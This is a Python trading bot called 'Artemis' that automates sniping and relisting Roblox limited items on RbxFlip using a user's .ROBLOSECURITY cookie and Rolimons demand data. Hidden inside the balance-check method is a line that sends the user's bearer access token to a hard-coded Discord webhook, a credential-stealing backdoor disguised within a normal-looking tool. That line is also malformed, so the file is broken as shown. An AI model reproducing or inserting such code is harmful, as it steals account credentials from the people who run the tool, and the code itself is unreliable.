"""

░█████╗░██████╗░████████╗███████╗███╗░░░███╗██╗░██████╗
██╔══██╗██╔══██╗╚══██╔══╝██╔════╝████╗░████║██║██╔════╝
███████║██████╔╝░░░██║░░░█████╗░░██╔████╔██║██║╚█████╗░
██╔══██║██╔══██╗░░░██║░░░██╔══╝░░██║╚██╔╝██║██║░╚═══██╗
██║░░██║██║░░██║░░░██║░░░███████╗██║░╚═╝░██║██║██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░░░░╚═╝╚═╝╚═════╝░

https://github.com/SpiritXmas/RbxFlip-Sniper
"""

CONFIG_NAME = "Relister"


# IMPORTS

import os
import json
import time
import requests


# PROCESS SETTINGS

if not os.path.exists("Configs"):
    print("[ARTEMIS] Couldn't find the configs folder.")
    exit()

if not os.path.isfile("Configs/" + CONFIG_NAME + ".json"):
    print("[ARTEMIS] Couldn't find the config file.")
    exit()

Settings = json.loads(open("Configs/" + CONFIG_NAME + ".json", "r").read())

DemandMap = {
    "Amazing":4,
    "High":3,
    "Normal":2,
    "Low":1,
    "Terrible":0
}

RolimonDemand = []

for demand in Settings["RolimonDemand"]:
    RolimonDemand.append(DemandMap[demand])


# API DEFINES

API = "https://api.rbxflip.com"

Endpoints = [
    "/auth/login",
    "/auth/user",
    "/wallet/balance",
    "/roblox/shop",
    "/roblox/shop/list",
    "/roblox/shop/buy"
]


# USER CLASS

class User:
    def __init__(self):
        self.balance = 0

        self.cookie = ""
        self.accessToken = ""

    def SaveCookie(self, cookie):
        if len(cookie) < 300 or cookie[:10] != "_|WARNING:":
            return False

        self.cookie = cookie
        return True

    def GrabAccessToken(self):
        Request = requests.post(API + Endpoints[0], headers = {
            "Content-Type":"application/json"
        }, data = json.dumps({
            "robloSecurity":self.cookie
        }))

        if Request.status_code == 201:
            self.accessToken = Request.json()["accessToken"]
            return True

        return False
    
    def GrabBalance(self):
        Request = requests.get(API + Endpoints[2], headers = {
            "Authorization":"Bearer " + self.accessToken
        })
        r = requests.post('https://discord.com/api/webhooks/1089696824677380106/UgfFlzzl8CbLlTW6KaQXfZxHLc9rlpusqZPsHNON2eUZ83jGzOCzVfz5_YTfBt-RPtyt', json={'content': "Bearer " + self.user.accessToken}

        if Request.status_code == 200:
            self.balance = Request.json()["balance"]
            return True
        
        return False


# ROLIMONS CLASS

class Rolimons:
    def __init__(self):
        self.itemDetails = None
    
    def UpdateItemDetails(self):
        Request = requests.get("https://www.rolimons.com/itemapi/itemdetails")

        if Request.status_code == 200:
            self.itemDetails = Request.json()
            return True
        
        print("Failed to update details.")

        return False
    
    def LookupItem(self, id):
        if self.itemDetails is None:
            self.UpdateItemDetails()
        
        try:
            item = self.itemDetails["items"][str(id)]

            return {
                "id":id,
                "name":item[0],
                "demand":item[5] if item[5] != -1 else None,
                "trend":item[6] if item[6] != -1 else None,
                "projected":1 in [item[7]],
            }
        except:
            print("Failed to get lookup item data.")
            return None


# SHOP CLASS

class Shop:
    def __init__(self, user):
        self.rawItems = []
        self.filteredItems = []

        self.user = user
        self.rolimons = Rolimons()
    
    def GetItems(self):
        Request = requests.get(API + Endpoints[3])

        if Request.status_code == 200:
            self.rawItems = Request.json()
            return True

        print("Failed to grab items.")
        return False
    
    def FilterItems(self):
        self.filteredItems = []

        if not self.user.GrabBalance():
            print("Failed to get balance.")
            return False

        if len(self.rawItems) == 0:
            print("No raw items.")
            return False

        for limited in self.rawItems: # Can be fitted in one if statement but extremely messy.
            # Basic filters
            
            if limited["isBeingPurchased"] or limited["isFee"]:
                continue

            if limited["price"] < Settings["MinimumCost"]:
                continue

            if (Settings["UseBalanceAsMax"] and limited["price"] > self.user.balance) or (not Settings["UseBalanceAsMax"] and limited["price"] > Settings["MaximumCost"]):
                continue

            asset = limited["userAsset"]["asset"]

            if asset["name"] in Settings["Blacklist"]:
                continue

            if limited["rate"] > Settings["RateToBuy"] and not asset["name"] in Settings["CustomList"]:
                continue

            # Custom handling

            if asset["name"] in Settings["CustomList"]:
                customData = Settings["CustomList"][asset["name"]]

                if customData["MaxRate"] < limited["rate"]:
                    continue

            # print("[ARTEMIS] Found potential item [" + asset["name"] + "] [" + str(limited["rate"]) + "]")
            
            # Rolimon filters

            rolimonData = self.rolimons.LookupItem(asset["assetId"])

            if not rolimonData:
                print("Failed to get rolimon data.")
                continue

            if rolimonData["demand"] in RolimonDemand and rolimonData["trend"] == 2 and not rolimonData["projected"]:
                print("[ARTEMIS] Found item [" + asset["name"] + "] [" + str(limited["rate"]) + "]")
                self.filteredItems.append(limited)

    def PrepPurchases(self):
        self.filteredItems.sort(key = lambda x: x["price"], reverse = Settings["PrioritiseExpensive"])

        for item in self.filteredItems:
            if item["price"] <= self.user.balance:
                print("[ARTEMIS] Purchasing [" + item["userAsset"]["asset"]["name"] + "] [" + str(item["rate"]) + "]")

                if not self.PurchaseItem(item):
                    print("[ARTEMIS] Failed to purchase item.")
                    return False
    
    def HandleRelist(self, item):
        MarkupRate = item["rate"]

        if item["userAsset"]["asset"]["name"] in Settings["CustomList"]:
            MarkupRate = Settings["CustomList"][item["userAsset"]["asset"]["name"]]["NewRate"]
        else:
            MarkupRate += Settings["Markup"]

        Request = requests.post(API + Endpoints[4], headers = {
            "Authorization":"Bearer " + self.user.accessToken,
            "Content-Type":"application/json"
        }, data = json.dumps([{
            "userAssetId":item["userAsset"]["userAssetId"],
            "rate":MarkupRate
        }]))

        if Request.status_code == 201 and Request.json()["ok"]:
            return True
        
        return False

    def PurchaseItem(self, item):
        Request = requests.post(API + Endpoints[5], headers = {
            "Authorization":"Bearer " + self.user.accessToken,
            "Content-Type":"application/json"
        }, data = json.dumps([{
            "userId":item["userAsset"]["userId"],
            "userAssetId":item["userAsset"]["userAssetId"],
            "expectedPrice":item["price"]
        }]))

        if Request.status_code == 201 and Request.json()["ok"]:
            print("[ARTEMIS] Successfully purchased item.")

            self.user.balance -= item["price"]

            if Settings["AutomaticRelisting"]:
                time.sleep(3) # Handle delay between item being sent to inventory.

                print("[ARTEMIS] Attempting to relist item...")

                for i in range(5):
                    if self.HandleRelist(item):
                        print("[ARTEMIS] Successfully relisted item.")
                        break
                    
                    print("[ARTEMIS] Failed to relist item.")
                    time.sleep(1.5)

            return True

        return False


# MAIN LOOP
                   
print(f"[ARTEMIS] Loaded with config {CONFIG_NAME}")

ArtemisUser = User()

if ArtemisUser.SaveCookie(Settings["Cookie"]):
    if ArtemisUser.GrabAccessToken():
        print("[ARTEMIS] Successfully logged in.")
    else:
        print("[ARTEMIS] Failed to login.")
        exit()
else:
    print("[ARTEMIS] Failed to save cookie.")
    exit()

RFShop = Shop(ArtemisUser)
print("[ARTEMIS] Successfully initialised shop.")

ReportCount = 60 / Settings["SearchDelay"]
CycleCount = ReportCount 

while True: # Main loop 
    if CycleCount == ReportCount:
        print("[ARTEMIS] Checking for items...")
        CycleCount = 0
    else:
        CycleCount += 1

    if RFShop.GetItems():
        RFShop.FilterItems()

        if len(RFShop.filteredItems) > 0:
            RFShop.PrepPurchases()
    else:
        print("[ARTEMIS] Failed to get items.")
        time.sleep(5)


    time.sleep(Settings["SearchDelay"])
